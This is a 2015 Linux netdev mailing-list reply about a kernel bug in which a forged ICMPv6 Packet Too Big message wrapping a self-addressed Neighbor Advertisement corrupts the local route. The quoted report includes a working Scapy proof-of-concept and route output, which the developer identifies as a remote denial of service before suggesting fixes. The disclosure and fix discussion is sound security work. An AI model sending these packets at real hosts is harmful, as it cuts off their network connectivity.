From: Hannes Frederic Sowa <hannes@stressinduktion.org>
Subject: Re: ICMPv6 too big Packet will makes the network unreachable
Date: Tue, 13 Oct 2015 14:04:33 +0200
Message-ID: <1444737873.1839422.408849937.7BB50DED@webmail.messagingengine.com>
References: <CAJFZqHz93RmSp369W508i8zbDmxhohG9n4UfxG1TnSxDPD4B=g@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain
Content-Transfer-Encoding: 7bit
To: Li RongQing <roy.qing.li@gmail.com>,
	netdev <netdev@vger.kernel.org>
Return-path: <netdev-owner@vger.kernel.org>
Received: from out1-smtp.messagingengine.com ([66.111.4.25]:35134 "EHLO
	out1-smtp.messagingengine.com" rhost-flags-OK-OK-OK-OK)
	by vger.kernel.org with ESMTP id S1752714AbbJMMEe (ORCPT
	<rfc822;netdev@vger.kernel.org>); Tue, 13 Oct 2015 08:04:34 -0400
Received: from compute6.internal (compute6.nyi.internal [10.202.2.46])
	by mailout.nyi.internal (Postfix) with ESMTP id E2EDD206A8
	for <netdev@vger.kernel.org>; Tue, 13 Oct 2015 08:04:33 -0400 (EDT)
In-Reply-To: <CAJFZqHz93RmSp369W508i8zbDmxhohG9n4UfxG1TnSxDPD4B=g@mail.gmail.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Hello

On Tue, Oct 13, 2015, at 09:09, Li RongQing wrote:
> 1. Machine with 2001:1b70:82a8:18:650:65:0:2 address, and receive wrong
> icmp packets
>     root@du1:~# ifconfig
>     eth10.650 Link encap:Ethernet  HWaddr 74:c9:9a:a7:e5:88
>               inet6 addr: fe80::76c9:9aff:fea7:e588/64 Scope:Link
>               inet6 addr: 2001:1b70:82a8:18:650:65:0:2/80 Scope:Global
>               UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
>               RX packets:1 errors:0 dropped:0 overruns:0 frame:0
>               TX packets:9 errors:0 dropped:0 overruns:0 carrier:0
>               collisions:0 txqueuelen:0
>               RX bytes:104 (104.0 B)  TX bytes:934 (934.0 B)
> 
> 2. ICMPv6 packet is as below.
> 
>    ###[ Ethernet ]###
>      dst       = 74:C9:9A:A7:E5:88
>      src       = ae:4f:44:f2:10:cc
>      type      = 0x86dd
>    ###[ IPv6 ]###
>         version   = 6
>         tc        = 0
>         fl        = 0
>         plen      = None
>         nh        = ICMPv6
>         hlim      = 64
>         src       = 2001:1b70:82a8:18:650:65:0:4
>         dst       = 2001:1b70:82a8:18:650:65:0:2
> 
>    ###[ ICMPv6 Packet Too Big ]###
>            type      = Packet too big
>            code      = 0
>            cksum     = None
>            mtu       = 1280
> 
>    ###[ IPv6 ]###
>               version   = 6
>               tc        = 0
>               fl        = 0
>               plen      = None
>               nh        = ICMPv6
>               hlim      = 255
>               src       = 2001:1b70:82a8:18:650:65:0:2
>               dst       = 2001:1b70:82a8:18:650:65:0:2
>    ###[ ICMPv6 Neighbor Discovery - Neighbor Advertisement ]###
>                  type      = Neighbor Advertisement
>                  code      = 0
>                  cksum     = None
>                  R         = 1
>                  S         = 0
>                  O         = 1
>                  res       = 0x0
>                  tgt       = 2001:1b70:82a8:18:650:65:0:2
> 
>    ##### Test #####
> 
> 3. Send ICMPv6  with Scapy to trigger fault.
> 
>    conf.iface='eth1'
>    eth = Ether(src='ae:4f:44:f2:10:cc', dst='74:C9:9A:A7:E5:88')
>    base = IPv6(src='2001:1b70:82a8:18:650:65:0:4',
> dst='2001:1b70:82a8:18:650:65:0:2')
>    ptb = ICMPv6PacketTooBig(type=2)
>    packet = eth/base/ptb
>    ptb_payload_na_base = IPv6(src='2001:1b70:82a8:18:650:65:0:2',
> dst='2001:1b70:82a8:18:650:65:0:2')
>    ptb_payload_na = ICMPv6ND_NA(type=136,
>    tgt='2001:1b70:82a8:18:650:65:0:2')
>    ptb_payload = ptb_payload_na_base/ptb_payload_na
>    packet = packet/ptb_payload
>    sendp(packet, iface="eth1.650", count=1)

That is a mess, yes. We should in real life scenarios restrict path mtu
updates to sockets which are bound to the mirrored portion of the packet
which is payload of the icmp payload. :( And not accept source addresses
which are obvious local.

Obviously icmpv6 notify routing engine without checks (how could they)
about the path mtu limitation.

> 
> 4.  route information  will enter the faulty state after Wait 600
> seconds,
> 
>    root@du1:~# ip route get 2001:1b70:82a8:18:650:65:0:2
>    local 2001:1b70:82a8:18:650:65:0:2 dev lo  proto none  src
> 2001:1b70:82a8:18:650:65:0:2  metric 0  expires 7sec mtu 1280
> 
>    root@du1:~# ip route get 2001:1b70:82a8:18:650:65:0:2
>    local 2001:1b70:82a8:18:650:65:0:2 dev lo  proto none  src
> 2001:1b70:82a8:18:650:65:0:2  metric 0  expires 3sec mtu 1280
> 
>    root@du1:~# ip route get 2001:1b70:82a8:18:650:65:0:2
>    2001:1b70:82a8:18:650:65:0:2 dev eth10.650  src
> 2001:1b70:82a8:18:650:65:0:2  metric 0
>        cache
>    root@du1:~#

Urks, it got promoted to a non-local route after removing thus rendering
a remote DoS possibility. This is bad bad bad.

Thanks for the report!

Hannes
